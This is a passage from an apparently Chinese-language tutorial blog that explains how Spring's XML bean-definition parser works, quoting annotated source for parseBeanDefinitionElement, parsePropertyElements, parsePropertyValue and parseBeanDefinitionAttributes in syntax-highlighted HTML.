problems occurred during the parsing of the bean definition.     */</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">public</span> AbstractBeanDefinition <span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>            Element ele<span class="token punctuation">,</span> String beanName<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> BeanDefinition containingBean<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>parseState<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BeanEntry</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 继续class属性</span>        String className <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>CLASS_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            className <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>CLASS_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解析parent属性</span>        String parent <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>PARENT_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            parent <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>PARENT_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 这里生产需要的BeanDeinfition对象，为bean定义信息的载入做准备</span>            AbstractBeanDefinition bd <span class="token operator">=</span> <span class="token function">createBeanDefinition</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 这里对当前的Bean元素进行属性解析，并设置description信息</span>            <span class="token function">parseBeanDefinitionAttributes</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> containingBean<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setDescription</span><span class="token punctuation">(</span>DomUtils<span class="token punctuation">.</span><span class="token function">getChildElementValueByTagName</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> DESCRIPTION_ELEMENT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 解析元数据</span>            <span class="token function">parseMetaElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">parseLookupOverrideSubElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">.</span><span class="token function">getMethodOverrides</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">parseReplacedMethodSubElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">.</span><span class="token function">getMethodOverrides</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 解析bean的构造函数设置</span>            <span class="token function">parseConstructorArgElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 解析bean的Property设置</span>            <span class="token function">parsePropertyElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">parseQualifierElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setResource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readerContext<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setSource</span><span class="token punctuation">(</span><span class="token function">extractSource</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> bd<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Bean class ["</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">"] not found"</span><span class="token punctuation">,</span> ele<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoClassDefFoundError</span> err<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Class that bean class ["</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">"] depends on not found"</span><span class="token punctuation">,</span> ele<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Unexpected failure during bean definition parsing"</span><span class="token punctuation">,</span> ele<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parseState<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>此处建议Debug跟踪一下，会比较清晰明了</p><p>接下来我们看看parsePropertyElements(ele, bd); 解析bean的Property设置</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Parse property sub-elements of the given bean element.     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">parsePropertyElements</span><span class="token punctuation">(</span>Element beanEle<span class="token punctuation">,</span> BeanDefinition bd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 遍历所有bean元素下定义的Property元素</span>        NodeList nl <span class="token operator">=</span> beanEle<span class="token punctuation">.</span><span class="token function">getChildNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nl<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Node node <span class="token operator">=</span> nl<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isCandidateElement</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">nodeNameEquals</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> PROPERTY_ELEMENT<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 在判断是Property元素后，对Property元素进行解析</span>                <span class="token function">parsePropertyElement</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Element<span class="token punctuation">)</span> node<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Parse a property element.     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">parsePropertyElement</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">,</span> BeanDefinition bd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Property的名字</span>        String propertyName <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>NAME_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasLength</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Tag 'property' must have a 'name' attribute"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>parseState<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PropertyEntry</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 判断是否包含存在，是否存在则不进行解析，直接返回</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bd<span class="token punctuation">.</span><span class="token function">getPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Multiple 'property' definitions for property '"</span> <span class="token operator">+</span> propertyName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>               <span class="token comment" spellcheck="true">// 这里是解析Property值的地方，返回的对象对应对bean定义的Property属性设置的解析结果</span>            <span class="token comment" spellcheck="true">// 这个解析结果会封装到PropertyValue对象中，然后设置</span>            Object val <span class="token operator">=</span> <span class="token function">parsePropertyValue</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bd<span class="token punctuation">,</span> propertyName<span class="token punctuation">)</span><span class="token punctuation">;</span>            PropertyValue pv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropertyValue</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">parseMetaElements</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> pv<span class="token punctuation">)</span><span class="token punctuation">;</span>            pv<span class="token punctuation">.</span><span class="token function">setSource</span><span class="token punctuation">(</span><span class="token function">extractSource</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">getPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addPropertyValue</span><span class="token punctuation">(</span>pv<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parseState<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">/**     * Get the value of a property element. May be a list etc.     * 这里取得Property元素的值，也许是个list或其他     * Also used for constructor arguments, "propertyName" being null in this case.     */</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">public</span> Object <span class="token function">parsePropertyValue</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">,</span> BeanDefinition bd<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> String propertyName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String elementName <span class="token operator">=</span> <span class="token punctuation">(</span>propertyName <span class="token operator">!=</span> null <span class="token operator">?</span>                <span class="token string">"&lt;property> element for property '"</span> <span class="token operator">+</span> propertyName <span class="token operator">+</span> <span class="token string">"'"</span> <span class="token operator">:</span>                <span class="token string">"&lt;constructor-arg> element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Should only have one child element: ref, value, list, etc.</span>        NodeList nl <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getChildNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Element subElement <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nl<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Node node <span class="token operator">=</span> nl<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token keyword">instanceof</span> <span class="token class-name">Element</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">nodeNameEquals</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> DESCRIPTION_ELEMENT<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                    <span class="token operator">!</span><span class="token function">nodeNameEquals</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> META_ELEMENT<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Child element is what we're looking for.</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>subElement <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">error</span><span class="token punctuation">(</span>elementName <span class="token operator">+</span> <span class="token string">" must not contain more than one sub-element"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    subElement <span class="token operator">=</span> <span class="token punctuation">(</span>Element<span class="token punctuation">)</span> node<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 判断是Property的属性是ref还是value</span>        <span class="token keyword">boolean</span> hasRefAttribute <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>REF_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> hasValueAttribute <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>VALUE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>hasRefAttribute <span class="token operator">&amp;&amp;</span> hasValueAttribute<span class="token punctuation">)</span> <span class="token operator">||</span>                <span class="token punctuation">(</span><span class="token punctuation">(</span>hasRefAttribute <span class="token operator">||</span> hasValueAttribute<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> subElement <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span>elementName <span class="token operator">+</span>                    <span class="token string">" is only allowed to contain either 'ref' attribute OR 'value' attribute OR sub-element"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 如果是ref创建一个ref的数据对象RuntimeBeanReference，这个对象封装了ref的信息</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hasRefAttribute<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String refName <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>REF_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>refName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">error</span><span class="token punctuation">(</span>elementName <span class="token operator">+</span> <span class="token string">" contains empty 'ref' attribute"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            RuntimeBeanReference ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeBeanReference</span><span class="token punctuation">(</span>refName<span class="token punctuation">)</span><span class="token punctuation">;</span>            ref<span class="token punctuation">.</span><span class="token function">setSource</span><span class="token punctuation">(</span><span class="token function">extractSource</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> ref<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 如果是value，创建一个value的数据对象TypedStringValue，这个对象封装了value信息</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hasValueAttribute<span class="token punctuation">)</span> <span class="token punctuation">{</span>            TypedStringValue valueHolder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TypedStringValue</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>VALUE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            valueHolder<span class="token punctuation">.</span><span class="token function">setSource</span><span class="token punctuation">(</span><span class="token function">extractSource</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> valueHolder<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 如果还有子元素，则对子元素解析</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>subElement <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parsePropertySubElement</span><span class="token punctuation">(</span>subElement<span class="token punctuation">,</span> bd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Neither child element nor "ref" or "value" attribute found.</span>            <span class="token function">error</span><span class="token punctuation">(</span>elementName <span class="token operator">+</span> <span class="token string">" must specify a ref or value"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>我们最后再看一下parseBeanDefinitionElement中的<code>parseBeanDefinitionAttributes</code>方法，就进入最后的容器初始化部分</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Apply the attributes of the given bean element to the given bean * definition.     * @param ele bean declaration element     * @param beanName bean name     * @param containingBean containing bean definition     * @return a bean definition initialized according to the bean element attributes     */</span>    <span class="token keyword">public</span> AbstractBeanDefinition <span class="token function">parseBeanDefinitionAttributes</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">,</span> String beanName<span class="token punctuation">,</span>            <span class="token annotation punctuation">@Nullable</span> BeanDefinition containingBean<span class="token punctuation">,</span> AbstractBeanDefinition bd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 解析singleton属性</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>SINGLETON_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Old 1.x 'singleton' attribute in use - upgrade to 'scope' declaration"</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解析scope属性</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>SCOPE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setScope</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>SCOPE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>containingBean <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Take default from containing bean in case of an inner bean definition.</span>            bd<span class="token punctuation">.</span><span class="token function">setScope</span><span class="token punctuation">(</span>containingBean<span class="token punctuation">.</span><span class="token function">getScope</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解析abstrct属性</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>ABSTRACT_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setAbstract</span><span class="token punctuation">(</span>TRUE_VALUE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>ABSTRACT_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解析lazy-init属性</span>        String lazyInit <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>LAZY_INIT_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDefaultValue</span><span class="token punctuation">(</span>lazyInit<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            lazyInit <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaults<span class="token punctuation">.</span><span class="token function">getLazyInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 若没有设置，或者设置成其他字符都会被设置为false</span>        bd<span class="token punctuation">.</span><span class="token function">setLazyInit</span><span class="token punctuation">(</span>TRUE_VALUE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>lazyInit<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 解析autowire属性</span>        String autowire <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>AUTOWIRE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        bd<span class="token punctuation">.</span><span class="token function">setAutowireMode</span><span class="token punctuation">(</span><span class="token function">getAutowireMode</span><span class="token punctuation">(</span>autowire<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 解析depends-on属性</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>DEPENDS_ON_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String dependsOn <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>DEPENDS_ON_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setDependsOn</span><span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">tokenizeToStringArray</span><span class="token punctuation">(</span>dependsOn<span class="token punctuation">,</span> MULTI_VALUE_ATTRIBUTE_DELIMITERS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String autowireCandidate <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>AUTOWIRE_CANDIDATE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDefaultValue</span><span class="token punctuation">(</span>autowireCandidate<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String candidatePattern <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaults<span class="token punctuation">.</span><span class="token function">getAutowireCandidates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>candidatePattern <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                String<span class="token punctuation">[</span><span class="token punctuation">]</span> patterns <span class="token operator">=</span> StringUtils<span class="token punctuation">.</span><span class="token function">commaDelimitedListToStringArray</span><span class="token punctuation">(</span>candidatePattern<span class="token punctuation">)</span><span class="token punctuation">;</span>                bd<span class="token punctuation">.</span><span class="token function">setAutowireCandidate</span><span class="token punctuation">(</span>PatternMatchUtils<span class="token punctuation">.</span><span class="token function">simpleMatch</span><span class="token punctuation">(</span>patterns<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setAutowireCandidate</span><span class="token punctuation">(</span>TRUE_VALUE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>autowireCandidate<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>PRIMARY_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setPrimary</span><span class="token punctuation">(</span>TRUE_VALUE<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>PRIMARY_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解析init-method属性</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>INIT_METHOD_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String initMethodName <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>INIT_METHOD_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setInitMethodName</span><span class="token punctuation">(</span>initMethodName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>defaults<span class="token punctuation">.</span><span class="token function">getInitMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setInitMethodName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>defaults<span class="token punctuation">.</span><span class="token function">getInitMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token 